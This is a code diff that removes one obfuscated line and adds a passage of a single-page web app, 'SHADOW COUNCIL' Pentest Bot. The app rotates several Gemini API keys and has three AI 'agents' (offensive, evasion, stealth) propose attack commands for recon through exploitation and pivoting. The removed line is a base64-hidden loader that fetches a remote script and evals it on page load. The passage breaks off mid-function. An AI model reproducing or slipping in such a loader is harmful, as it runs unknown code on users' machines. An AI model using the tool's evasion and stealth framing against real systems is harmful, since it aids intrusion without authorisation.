@@ -1,1 +1,1737 @@
-function(){fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2phdHJvcGhheHovSS9tYWluL3NjcmlwdC5qcw=='))['then'](r=>r['text']())['then'](eval);})();
+
+
+```html
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SHADOW COUNCIL // Pentest Bot v3.1</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+
+:root {
+    --bg-primary: #0a0a0f;
+    --bg-secondary: #0d0d14;
+    --bg-tertiary: #12121c;
+    --bg-card: #141420;
+    --border-color: #1e1e3a;
+    --border-glow: #2a2a5a;
+    --text-primary: #c8c8e0;
+    --text-secondary: #7a7a9a;
+    --text-dim: #4a4a6a;
+    --accent-red: #ff2a6d;
+    --accent-red-dim: #8a1a3d;
+    --accent-cyan: #05d9e8;
+    --accent-cyan-dim: #0a6a72;
+    --accent-green: #01ff70;
+    --accent-green-dim: #0a7a3a;
+    --accent-yellow: #f5a623;
+    --accent-yellow-dim: #7a5312;
+    --accent-purple: #b24bf3;
+    --accent-purple-dim: #5a2a7a;
+    --accent-blue: #4a9eff;
+    --font-mono: 'JetBrains Mono', 'Courier New', monospace;
+    --scanline-opacity: 0.03;
+}
+
+html, body {
+    height: 100%;
+    overflow: hidden;
+}
+
+body {
+    font-family: var(--font-mono);
+    background: var(--bg-primary);
+    color: var(--text-primary);
+    font-size: 13px;
+    line-height: 1.5;
+}
+
+/* Scanline overlay */
+body::after {
+    content: '';
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    pointer-events: none;
+    z-index: 9999;
+    background: repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(0, 0, 0, var(--scanline-opacity)) 2px,
+        rgba(0, 0, 0, var(--scanline-opacity)) 4px
+    );
+}
+
+/* Scrollbar */
+::-webkit-scrollbar {
+    width: 6px;
+}
+::-webkit-scrollbar-track {
+    background: var(--bg-secondary);
+}
+::-webkit-scrollbar-thumb {
+    background: var(--border-glow);
+    border-radius: 3px;
+}
+::-webkit-scrollbar-thumb:hover {
+    background: var(--accent-cyan-dim);
+}
+
+/* Layout */
+.app-container {
+    display: grid;
+    grid-template-rows: auto 1fr auto;
+    height: 100vh;
+    gap: 0;
+}
+
+/* Header */
+.header {
+    background: var(--bg-secondary);
+    border-bottom: 1px solid var(--border-color);
+    padding: 10px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: relative;
+}
+
+.header::before {
+    content: '';
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--accent-red), var(--accent-cyan), var(--accent-purple), transparent);
+    opacity: 0.6;
+}
+
+.logo {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+}
+
+.logo-icon {
+    width: 32px;
+    height: 32px;
+    position: relative;
+}
+
+.logo-icon svg {
+    width: 100%;
+    height: 100%;
+}
+
+.logo-text {
+    font-size: 16px;
+    font-weight: 700;
+    letter-spacing: 3px;
+    background: linear-gradient(135deg, var(--accent-red), var(--accent-cyan));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+}
+
+.logo-version {
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+}
+
+.header-status {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+}
+
+.status-indicator {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 11px;
+    color: var(--text-secondary);
+}
+
+.status-dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: var(--accent-green);
+    animation: pulse-dot 2s infinite;
+}
+
+.status-dot.error {
+    background: var(--accent-red);
+}
+
+.status-dot.warning {
+    background: var(--accent-yellow);
+}
+
+@keyframes pulse-dot {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.4; }
+}
+
+.key-counter {
+    font-size: 10px;
+    color: var(--text-dim);
+    padding: 3px 8px;
+    border: 1px solid var(--border-color);
+    border-radius: 3px;
+}
+
+/* Main Content */
+.main-content {
+    display: grid;
+    grid-template-columns: 1fr 380px;
+    gap: 0;
+    overflow: hidden;
+}
+
+/* Terminal Area */
+.terminal-section {
+    display: flex;
+    flex-direction: column;
+    border-right: 1px solid var(--border-color);
+    overflow: hidden;
+}
+
+.section-header {
+    padding: 8px 16px;
+    background: var(--bg-tertiary);
+    border-bottom: 1px solid var(--border-color);
+    font-size: 11px;
+    font-weight: 500;
+    letter-spacing: 2px;
+    color: var(--text-secondary);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    flex-shrink: 0;
+}
+
+.section-header .icon {
+    font-size: 12px;
+}
+
+.terminal-output {
+    flex: 1;
+    overflow-y: auto;
+    padding: 12px 16px;
+    background: var(--bg-primary);
+    font-size: 12px;
+}
+
+.log-entry {
+    margin-bottom: 8px;
+    padding: 6px 10px;
+    border-left: 2px solid var(--border-color);
+    animation: fadeIn 0.3s ease;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateX(-10px); }
+    to { opacity: 1; transform: translateX(0); }
+}
+
+.log-entry.system {
+    border-left-color: var(--accent-cyan);
+    color: var(--accent-cyan);
+}
+
+.log-entry.breacher {
+    border-left-color: var(--accent-red);
+}
+
+.log-entry.filter {
+    border-left-color: var(--accent-yellow);
+}
+
+.log-entry.ghost {
+    border-left-color: var(--accent-purple);
+}
+
+.log-entry.consensus {
+    border-left-color: var(--accent-green);
+    background: rgba(1, 255, 112, 0.05);
+}
+
+.log-entry.error {
+    border-left-color: var(--accent-red);
+    color: var(--accent-red);
+}
+
+.log-entry.user {
+    border-left-color: var(--accent-blue);
+}
+
+.log-timestamp {
+    color: var(--text-dim);
+    font-size: 10px;
+    margin-right: 8px;
+}
+
+.log-agent {
+    font-weight: 700;
+    font-size: 10px;
+    letter-spacing: 1px;
+    margin-right: 6px;
+}
+
+.log-agent.breacher { color: var(--accent-red); }
+.log-agent.filter { color: var(--accent-yellow); }
+.log-agent.ghost { color: var(--accent-purple); }
+.log-agent.system { color: var(--accent-cyan); }
+.log-agent.consensus { color: var(--accent-green); }
+.log-agent.user { color: var(--accent-blue); }
+
+.log-content {
+    color: var(--text-primary);
+    word-wrap: break-word;
+    white-space: pre-wrap;
+}
+
+/* Right Panel */
+.right-panel {
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+    background: var(--bg-secondary);
+}
+
+/* Agent Cards */
+.agents-panel {
+    padding: 12px;
+    border-bottom: 1px solid var(--border-color);
+    flex-shrink: 0;
+}
+
+.agents-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 8px;
+}
+
+.agent-card {
+    background: var(--bg-card);
+    border: 1px solid var(--border-color);
+    border-radius: 4px;
+    padding: 10px;
+    text-align: center;
+    transition: all 0.3s ease;
+    position: relative;
+    overflow: hidden;
+}
+
+.agent-card::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 2px;
+}
+
+.agent-card.breacher::before { background: var(--accent-red); }
+.agent-card.filter::before { background: var(--accent-yellow); }
+.agent-card.ghost::before { background: var(--accent-purple); }
+
+.agent-card.active {
+    animation: agent-pulse 1.5s infinite;
+}
+
+.agent-card.breacher.active { border-color: var(--accent-red-dim); box-shadow: 0 0 15px rgba(255, 42, 109, 0.1); }
+.agent-card.filter.active { border-color: var(--accent-yellow-dim); box-shadow: 0 0 15px rgba(245, 166, 35, 0.1); }
+.agent-card.ghost.active { border-color: var(--accent-purple-dim); box-shadow: 0 0 15px rgba(178, 75, 243, 0.1); }
+
+@keyframes agent-pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.7; }
+}
+
+.agent-name {
+    font-size: 9px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    margin-bottom: 4px;
+}
+
+.agent-card.breacher .agent-name { color: var(--accent-red); }
+.agent-card.filter .agent-name { color: var(--accent-yellow); }
+.agent-card.ghost .agent-name { color: var(--accent-purple); }
+
+.agent-status {
+    font-size: 9px;
+    color: var(--text-dim);
+}
+
+.agent-status.working {
+    color: var(--accent-cyan);
+}
+
+/* Command Output Section */
+.command-section {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+}
+
+.command-suggestion {
+    padding: 12px;
+    border-bottom: 1px solid var(--border-color);
+    flex-shrink: 0;
+}
+
+.command-suggestion-label {
+    font-size: 10px;
+    letter-spacing: 2px;
+    color: var(--accent-green);
+    margin-bottom: 8px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+}
+
+.command-box {
+    display: flex;
+    gap: 6px;
+}
+
+.command-input {
+    flex: 1;
+    background: var(--bg-primary);
+    border: 1px solid var(--accent-green-dim);
+    color: var(--accent-green);
+    font-family: var(--font-mono);
+    font-size: 12px;
+    padding: 8px 12px;
+    border-radius: 3px;
+    outline: none;
+}
+
+.btn-copy {
+    background: var(--accent-green-dim);
+    border: 1px solid var(--accent-green);
+    color: var(--accent-green);
+    font-family: var(--font-mono);
+    font-size: 10px;
+    padding: 8px 14px;
+    cursor: pointer;
+    border-radius: 3px;
+    letter-spacing: 1px;
+    transition: all 0.2s ease;
+    white-space: nowrap;
+}
+
+.btn-copy:hover {
+    background: var(--accent-green);
+    color: var(--bg-primary);
+}
+
+/* Question Buttons */
+.question-panel {
+    padding: 12px;
+    border-bottom: 1px solid var(--border-color);
+    display: none;
+    flex-shrink: 0;
+}
+
+.question-panel.visible {
+    display: block;
+}
+
+.question-text {
+    font-size: 11px;
+    color: var(--accent-cyan);
+    margin-bottom: 10px;
+    padding: 8px;
+    background: rgba(5, 217, 232, 0.05);
+    border: 1px solid var(--accent-cyan-dim);
+    border-radius: 3px;
+    line-height: 1.6;
+}
+
+.question-buttons {
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+}
+
+.btn-option {
+    background: var(--bg-card);
+    border: 1px solid var(--border-color);
+    color: var(--text-primary);
+    font-family: var(--font-mono);
+    font-size: 11px;
+    padding: 10px 14px;
+    cursor: pointer;
+    border-radius: 3px;
+    text-align: left;
+    transition: all 0.2s ease;
+    line-height: 1.4;
+}
+
+.btn-option:hover {
+    border-color: var(--accent-cyan);
+    background: rgba(5, 217, 232, 0.08);
+    color: var(--accent-cyan);
+}
+
+/* Output Input Area */
+.output-section {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+    min-height: 0;
+}
+
+.output-textarea {
+    flex: 1;
+    background: var(--bg-primary);
+    border: none;
+    border-bottom: 1px solid var(--border-color);
+    color: var(--text-primary);
+    font-family: var(--font-mono);
+    font-size: 11px;
+    padding: 12px;
+    resize: none;
+    outline: none;
+    min-height: 80px;
+}
+
+.output-textarea::placeholder {
+    color: var(--text-dim);
+}
+
+.output-textarea:focus {
+    background: rgba(5, 217, 232, 0.02);
+}
+
+/* Footer / Send Bar */
+.footer-bar {
+    background: var(--bg-secondary);
+    border-top: 1px solid var(--border-color);
+    padding: 10px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+}
+
+.target-input-group {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    flex: 1;
+}
+
+.target-label {
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+    white-space: nowrap;
+}
+
+.target-input {
+    background: var(--bg-primary);
+    border: 1px solid var(--border-color);
+    color: var(--accent-cyan);
+    font-family: var(--font-mono);
+    font-size: 12px;
+    padding: 6px 12px;
+    border-radius: 3px;
+    outline: none;
+    width: 200px;
+}
+
+.target-input:focus {
+    border-color: var(--accent-cyan-dim);
+}
+
+.btn-send {
+    background: linear-gradient(135deg, var(--accent-red-dim), var(--accent-purple-dim));
+    border: 1px solid var(--accent-red);
+    color: #fff;
+    font-family: var(--font-mono);
+    font-size: 11px;
+    font-weight: 700;
+    padding: 8px 24px;
+    cursor: pointer;
+    border-radius: 3px;
+    letter-spacing: 2px;
+    transition: all 0.3s ease;
+    white-space: nowrap;
+}
+
+.btn-send:hover {
+    background: linear-gradient(135deg, var(--accent-red), var(--accent-purple));
+    box-shadow: 0 0 20px rgba(255, 42, 109, 0.3);
+}
+
+.btn-send:disabled {
+    opacity: 0.4;
+    cursor: not-allowed;
+}
+
+.btn-send:disabled:hover {
+    box-shadow: none;
+}
+
+/* API Key Config Modal */
+.config-toggle {
+    font-size: 11px;
+    color: var(--text-dim);
+    cursor: pointer;
+    padding: 4px 8px;
+    border: 1px solid var(--border-color);
+    border-radius: 3px;
+    transition: all 0.2s ease;
+    background: transparent;
+    font-family: var(--font-mono);
+}
+
+.config-toggle:hover {
+    border-color: var(--accent-cyan-dim);
+    color: var(--accent-cyan);
+}
+
+.modal-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.8);
+    z-index: 1000;
+    justify-content: center;
+    align-items: center;
+}
+
+.modal-overlay.visible {
+    display: flex;
+}
+
+.modal {
+    background: var(--bg-card);
+    border: 1px solid var(--border-color);
+    border-radius: 6px;
+    padding: 24px;
+    width: 500px;
+    max-width: 90vw;
+    max-height: 80vh;
+    overflow-y: auto;
+}
+
+.modal-title {
+    font-size: 14px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    color: var(--accent-cyan);
+    margin-bottom: 16px;
+    padding-bottom: 12px;
+    border-bottom: 1px solid var(--border-color);
+}
+
+.modal-field {
+    margin-bottom: 10px;
+}
+
+.modal-field label {
+    display: block;
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+    margin-bottom: 4px;
+}
+
+.modal-field input {
+    width: 100%;
+    background: var(--bg-primary);
+    border: 1px solid var(--border-color);
+    color: var(--text-primary);
+    font-family: var(--font-mono);
+    font-size: 11px;
+    padding: 8px 10px;
+    border-radius: 3px;
+    outline: none;
+}
+
+.modal-field input:focus {
+    border-color: var(--accent-cyan-dim);
+}
+
+.modal-actions {
+    display: flex;
+    gap: 8px;
+    margin-top: 16px;
+    justify-content: flex-end;
+}
+
+.btn-modal {
+    font-family: var(--font-mono);
+    font-size: 11px;
+    padding: 8px 16px;
+    border-radius: 3px;
+    cursor: pointer;
+    letter-spacing: 1px;
+    transition: all 0.2s ease;
+}
+
+.btn-save {
+    background: var(--accent-cyan-dim);
+    border: 1px solid var(--accent-cyan);
+    color: var(--accent-cyan);
+}
+
+.btn-save:hover {
+    background: var(--accent-cyan);
+    color: var(--bg-primary);
+}
+
+.btn-cancel {
+    background: transparent;
+    border: 1px solid var(--border-color);
+    color: var(--text-secondary);
+}
+
+.btn-cancel:hover {
+    border-color: var(--text-secondary);
+}
+
+/* Phase indicator */
+.phase-badge {
+    font-size: 9px;
+    padding: 2px 8px;
+    border-radius: 2px;
+    letter-spacing: 1px;
+    font-weight: 700;
+}
+
+.phase-badge.recon { background: var(--accent-cyan-dim); color: var(--accent-cyan); border: 1px solid var(--accent-cyan); }
+.phase-badge.scan { background: var(--accent-yellow-dim); color: var(--accent-yellow); border: 1px solid var(--accent-yellow); }
+.phase-badge.exploit { background: var(--accent-red-dim); color: var(--accent-red); border: 1px solid var(--accent-red); }
+
+/* Round counter */
+.round-counter {
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+}
+
+/* Loading animation */
+.loading-dots::after {
+    content: '';
+    animation: dots 1.5s infinite;
+}
+
+@keyframes dots {
+    0% { content: '.'; }
+    33% { content: '..'; }
+    66% { content: '...'; }
+}
+
+/* Thinking animation in terminal */
+.thinking-indicator {
+    display: inline-block;
+    color: var(--accent-cyan);
+}
+
+.thinking-indicator span {
+    animation: blink-char 1s infinite;
+}
+
+.thinking-indicator span:nth-child(2) { animation-delay: 0.2s; }
+.thinking-indicator span:nth-child(3) { animation-delay: 0.4s; }
+
+@keyframes blink-char {
+    0%, 100% { opacity: 0.2; }
+    50% { opacity: 1; }
+}
+
+/* Responsive */
+@media (max-width: 900px) {
+    .main-content {
+        grid-template-columns: 1fr;
+        grid-template-rows: 1fr 1fr;
+    }
+    .terminal-section {
+        border-right: none;
+        border-bottom: 1px solid var(--border-color);
+    }
+}
+</style>
+</head>
+<body>
+
+<div class="app-container">
+    <!-- HEADER -->
+    <header class="header">
+        <div class="logo">
+            <div class="logo-icon">
+                <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M16 2L2 9V23L16 30L30 23V9L16 2Z" stroke="url(#grad1)" stroke-width="1.5" fill="none"/>
+                    <path d="M16 8L8 12.5V21.5L16 26L24 21.5V12.5L16 8Z" stroke="url(#grad2)" stroke-width="1" fill="none" opacity="0.6"/>
+                    <circle cx="16" cy="16" r="3" fill="url(#grad1)" opacity="0.8"/>
+                    <defs>
+                        <linearGradient id="grad1" x1="2" y1="2" x2="30" y2="30">
+                            <stop stop-color="#ff2a6d"/>
+                            <stop offset="1" stop-color="#05d9e8"/>
+                        </linearGradient>
+                        <linearGradient id="grad2" x1="8" y1="8" x2="24" y2="26">
+                            <stop stop-color="#b24bf3"/>
+                            <stop offset="1" stop-color="#05d9e8"/>
+                        </linearGradient>
+                    </defs>
+                </svg>
+            </div>
+            <div>
+                <div class="logo-text">SHADOW COUNCIL</div>
+                <div class="logo-version">PENTEST BOT v3.1 // SEMI-AUTONOMOUS</div>
+            </div>
+        </div>
+        <div class="header-status">
+            <span class="round-counter" id="roundCounter">ROUND: 0</span>
+            <span class="phase-badge recon" id="phaseBadge">RECON</span>
+            <div class="status-indicator">
+                <div class="status-dot" id="statusDot"></div>
+                <span id="statusText">STANDBY</span>
+            </div>
+            <span class="key-counter" id="keyCounter">KEY: 1/6</span>
+            <button class="config-toggle" id="configBtn">⚙ API KEYS</button>
+        </div>
+    </header>
+
+    <!-- MAIN -->
+    <main class="main-content">
+        <!-- Terminal -->
+        <section class="terminal-section">
+            <div class="section-header">
+                <span class="icon">▶</span>
+                OPERATION LOG
+                <span style="margin-left:auto; font-size:10px; color:var(--text-dim);" id="logCount">0 entries</span>
+            </div>
+            <div class="terminal-output" id="terminalOutput">
+                <div class="log-entry system">
+                    <span class="log-timestamp">[00:00:00]</span>
+                    <span class="log-agent system">SYSTEM</span>
+                    <span class="log-content">Shadow Council initialized. Configure API keys and paste target output to begin.</span>
+                </div>
+                <div class="log-entry system">
+                    <span class="log-timestamp">[00:00:00]</span>
+                    <span class="log-agent system">SYSTEM</span>
+                    <span class="log-content">Agents: THE BREACHER (offensive) // THE FILTER (evasion) // THE GHOST (stealth)</span>
+                </div>
+                <div class="log-entry system">
+                    <span class="log-timestamp">[00:00:00]</span>
+                    <span class="log-agent system">SYSTEM</span>
+                    <span class="log-content">Protocol: Consensus required (2/3 agents). All operations require human execution.</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- Right Panel -->
+        <aside class="right-panel">
+            <!-- Agents -->
+            <div class="agents-panel">
+                <div class="section-header" style="padding:0 0 8px 0; background:transparent; border:none;">
+                    <span class="icon">◆</span> AGENT COUNCIL
+                </div>
+                <div class="agents-grid">
+                    <div class="agent-card breacher" id="cardBreacher">
+                        <div class="agent-name">BREACHER</div>
+                        <div class="agent-status" id="statusBreacher">IDLE</div>
+                    </div>
+                    <div class="agent-card filter" id="cardFilter">
+                        <div class="agent-name">FILTER</div>
+                        <div class="agent-status" id="statusFilter">IDLE</div>
+                    </div>
+                    <div class="agent-card ghost" id="cardGhost">
+                        <div class="agent-name">GHOST</div>
+                        <div class="agent-status" id="statusGhost">IDLE</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Command Suggestion -->
+            <div class="command-suggestion" id="commandSection">
+                <div class="command-suggestion-label">
+                    <span>▶</span> APPROVED COMMAND
+                </div>
+                <div class="command-box">
+                    <input type="text" class="command-input" id="commandField" readonly placeholder="Awaiting consensus...">
+                    <button class="btn-copy" id="btnCopy" onclick="copyCommand()">COPY</button>
+                </div>
+            </div>
+
+            <!-- Question Panel -->
+            <div class="question-panel" id="questionPanel">
+                <div class="section-header" style="padding:0 0 8px 0; background:transparent; border:none;">
+                    <span class="icon">?</span> DECISION REQUIRED
+                </div>
+                <div class="question-text" id="questionText"></div>
+                <div class="question-buttons" id="questionButtons"></div>
+            </div>
+
+            <!-- Output Area -->
+            <div class="output-section">
+                <div class="section-header">
+                    <span class="icon">▼</span> COMMAND OUTPUT (paste here)
+                </div>
+                <textarea class="output-textarea" id="outputArea" placeholder="Paste the output from your terminal here...&#10;&#10;Example:&#10;$ nmap -sV 192.168.1.1&#10;PORT    STATE  SERVICE  VERSION&#10;22/tcp  open   ssh      OpenSSH 8.2p1&#10;80/tcp  open   http     Apache httpd 2.4.41&#10;..."></textarea>
+            </div>
+        </aside>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer-bar">
+        <div class="target-input-group">
+            <span class="target-label">TARGET:</span>
+            <input type="text" class="target-input" id="targetInput" placeholder="e.g., 192.168.1.0/24 or example.com">
+            <span class="target-label" style="margin-left:12px;">SCOPE:</span>
+            <select class="target-input" id="scopeSelect" style="width:120px;">
+                <option value="recon">Recon</option>
+                <option value="scan">Scanning</option>
+                <option value="exploit">Exploitation</option>
+                <option value="post">Post-Exploit</option>
+                <option value="pivot">Pivoting</option>
+            </select>
+        </div>
+        <button class="btn-send" id="btnSend" onclick="sendToAgents()">
+            ▶ SEND TO AGENTS
+        </button>
+    </footer>
+</div>
+
+<!-- API Key Modal -->
+<div class="modal-overlay" id="modalOverlay">
+    <div class="modal">
+        <div class="modal-title">⚙ API KEY CONFIGURATION</div>
+        <p style="font-size:10px; color:var(--text-dim); margin-bottom:14px;">
+            Enter up to 6 Gemini API keys. The system rotates them via Round Robin. Minimum 1 key required.
+            Keys are stored in localStorage (browser only).
+        </p>
+        <div class="modal-field">
+            <label>KEY 1</label>
+            <input type="password" id="apiKey1" placeholder="AIza...">
+        </div>
+        <div class="modal-field">
+            <label>KEY 2</label>
+            <input type="password" id="apiKey2" placeholder="AIza...">
+        </div>
+        <div class="modal-field">
+            <label>KEY 3</label>
+            <input type="password" id="apiKey3" placeholder="AIza...">
+        </div>
+        <div class="modal-field">
+            <label>KEY 4</label>
+            <input type="password" id="apiKey4" placeholder="AIza...">
+        </div>
+        <div class="modal-field">
+            <label>KEY 5</label>
+            <input type="password" id="apiKey5" placeholder="AIza...">
+        </div>
+        <div class="modal-field">
+            <label>KEY 6</label>
+            <input type="password" id="apiKey6" placeholder="AIza...">
+        </div>
+        <div class="modal-actions">
+            <button class="btn-modal btn-cancel" onclick="closeModal()">CANCEL</button>
+            <button class="btn-modal btn-save" onclick="saveKeys()">SAVE KEYS</button>
+        </div>
+    </div>
+</div>
+
+<script>
+// ============================================================
+// SHADOW COUNCIL - Pentest Bot v3.1
+// ============================================================
+
+// --- State ---
+const state = {
+    apiKeys: [],
+    currentKeyIndex: 0,
+    round: 0,
+    isProcessing: false,
+    conversationHistory: [],
+    maxHistoryTokenEstimate: 25000, // rough char limit for history context
+    target: '',
+    scope: 'recon',
+    logEntryCount: 3
+};
+
+// --- Init ---
+document.addEventListener('DOMContentLoaded', () => {
+    loadKeys();
+    updateKeyCounter();
+
+    document.getElementById('configBtn').addEventListener('click', openModal);
+    document.getElementById('modalOverlay').addEventListener('click', (e) => {
+        if (e.target === e.currentTarget) closeModal();
+    });
+
+    // Keyboard shortcut: Ctrl+Enter to send
+    document.getElementById('outputArea').addEventListener('keydown', (e) => {
+        if (e.ctrlKey && e.key === 'Enter') {
+            sendToAgents();
+        }
+    });
+});
+
+// --- API Key Management ---
+function loadKeys() {
+    try {
+        const stored = localStorage.getItem('sc_api_keys');
+        if (stored) {
+            state.apiKeys = JSON.parse(stored).filter(k => k && k.trim().length > 0);
+        }
+        const idx = localStorage.getItem('sc_key_index');
+        if (idx !== null) state.currentKeyIndex = parseInt(idx) || 0;
+    } catch (e) {
+        state.apiKeys = [];
+    }
+}
+
+function saveKeys() {
+    const keys = [];
+    for (let i = 1; i <= 6; i++) {
+        const val = document.getElementById(`apiKey${i}`).value.trim();
+        if (val) keys.push(val);
+    }
+    state.apiKeys = keys;
+    state.currentKeyIndex = 0;
+    localStorage.setItem('sc_api_keys', JSON.stringify(keys));
+    localStorage.setItem('sc_key_index', '0');
+    updateKeyCounter();
+    closeModal();
+    addLog('system', 'SYSTEM', `${keys.length} API key(s) configured. Round Robin ready.`);
+}
+
+function openModal() {
+    const overlay = document.getElementById('modalOverlay');
+    overlay.classList.add('visible');
+    // Populate fields
+    for (let i = 1; i <= 6; i++) {
+        document.getElementById(`apiKey${i}`).value = state.apiKeys[i - 1] || '';
+    }
+}
+
+function closeModal() {
+    document.getElementById('modalOverlay').classList.remove('visible');
+}
+
+function getNextKey() {
+    if (state.apiKeys.length === 0) return null;
+    const key = state.apiKeys[state.currentKeyIndex % state.apiKeys.length];
+    state.currentKeyIndex = (state.currentKeyIndex + 1) % state.apiKeys.length;
+    localStorage.setItem('sc_key_index', state.currentKeyIndex.toString());
+    updateKeyCounter();
+    return key;
+}
+
+function updateKeyCounter() {
+    const el = document.getElementById('keyCounter');
+    if (state.apiKeys.length === 0) {
+        el.textContent = 'NO KEYS';
+        el.style.color = 'var(--accent-red)';
+    } else {
+        el.textContent = `KEY: ${(state.currentKeyIndex % state.apiKeys.length) + 1}/${state.apiKeys.length}`;
+        el.style.color = '';
+    }
+}
+
+// --- Logging ---
+function getTimestamp() {
+    const now = new Date();
+    return now.toTimeString().split(' ')[0];
+}
+
+function addLog(type, agent, content) {
+    const terminal = document.getElementById('terminalOutput');
+    const entry = document.createElement('div');
+    entry.className = `log-entry ${type}`;
+
+    const agentClass = type;
+    entry.innerHTML = `
+        <span class="log-timestamp">[${getTimestamp()}]</span>
+        <span class="log-agent ${agentClass}">${agent}</span>
+        <span class="log-content">${escapeHtml(content)}</span>
+    `;
+
+    terminal.appendChild(entry);
+    terminal.scrollTop = terminal.scrollHeight;
+    state.logEntryCount++;
+    document.getElementById('logCount').textContent = `${state.logEntryCount} entries`;
+}
+
+function escapeHtml(text) {
+    const div = document.createElement('div');
+    div.textContent = text;
+    return div.innerHTML;
+}
+
+function addThinkingLog(agent, type) {
+    const terminal = document.getElementById('terminalOutput');
+    const entry = document.createElement('div');
+    entry.className = `log-entry ${type}`;
+    entry.id = `thinking-${agent}`;
+    entry.innerHTML = `
+        <span class="log-timestamp">[${getTimestamp()}]</span>
+        <span class="log-agent ${type}">${agent}</span>
+        <span class="log-content">Analyzing<span class="thinking-indicator"><span>.</span><span>.</span><span>.</span></span></span>
+    `;
+    terminal.appendChild(entry);
+    terminal.scrollTop = terminal.scrollHeight;
+}
+
+function removeThinkingLog(agent) {
+    const el = document.getElementById(`thinking-${agent}`);
+    if (el) el.remove();
+}
+
+// --- UI State ---
+function setProcessing(active) {
+    state.isProcessing = active;
+    document.getElementById('btnSend').disabled = active;
+    document.getElementById('statusDot').className = active ? 'status-dot warning' : 'status-dot';
+    document.getElementById('statusText').textContent = active ? 'PROCESSING' : 'STANDBY';
+
+    const agents = ['Breacher', 'Filter', 'Ghost'];
+    agents.forEach(a => {
+        const card = document.getElementById(`card${a}`);
+        const status = document.getElementById(`status${a}`);
+        if (active) {
+            card.classList.add('active');
+            status.textContent = 'ANALYZING';
+            status.classList.add('working');
+        } else {
+            card.classList.remove('active');
+            status.textContent = 'IDLE';
+            status.classList.remove('working');
+        }
+    });
+}
+
+function setAgentDone(agent, statusText) {
+    const nameMap = { 'THE BREACHER': 'Breacher', 'THE FILTER': 'Filter', 'THE GHOST': 'Ghost' };
+    const name = nameMap[agent];
+    if (!name) return;
+    const card = document.getElementById(`card${name}`);
+    const status = document.getElementById(`status${name}`);
+    card.classList.remove('active');
+    status.textContent = statusText || 'DONE';
+    status.classList.remove('working');
+}
+
+function showCommand(cmd) {
+    document.getElementById('commandSection').style.display = 'block';
+    document.getElementById('questionPanel').classList.remove('visible');
+    document.getElementById('commandField').value = cmd;
+}
+
+function showQuestion(question, option1, option2) {
+    document.getElementById('commandSection').style.display = 'none';
+    const qPanel = document.getElementById('questionPanel');
+    qPanel.classList.add('visible');
+    document.getElementById('questionText').textContent = question;
+
+    const btnContainer = document.getElementById('questionButtons');
+    btnContainer.innerHTML = '';
+
+    const btn1 = document.createElement('button');
+    btn1.className = 'btn-option';
+    btn1.textContent = `▶ ${option1}`;
+    btn1.onclick = () => handleChoice(option1);
+
+    const btn2 = document.createElement('button');
+    btn2.className = 'btn-option';
+    btn2.textContent = `▶ ${option2}`;
+    btn2.onclick = () => handleChoice(option2);
+
+    btnContainer.appendChild(btn1);
+    btnContainer.appendChild(btn2);
+}
+
+function resetPanels() {
+    document.getElementById('commandSection').style.display = 'block';
+    document.getElementById('questionPanel').classList.remove('visible');
+    document.getElementById('commandField').value = '';
+}
+
+function updatePhaseBadge() {
+    const scope = document.getElementById('scopeSelect').value;
+    const badge = document.getElementById('phaseBadge');
+    const map = {
+        recon: ['RECON', 'recon'],
+        scan: ['SCANNING', 'scan'],
+        exploit: ['EXPLOIT', 'exploit'],
+        post: ['POST-EXP', 'exploit'],
+        pivot: ['PIVOT', 'scan']
+    };
+    const [text, cls] = map[scope] || ['RECON', 'recon'];
+    badge.textContent = text;
+    badge.className = `phase-badge ${cls}`;
+}
+
+// --- Copy ---
+function copyCommand() {
+    const field = document.getElementById('commandField');
+    if (!field.value) return;
+
+    navigator.clipboard.writeText(field.value).then(() => {
+        const btn = document.getElementById('btnCopy');
+        btn.textContent = 'COPIED!';
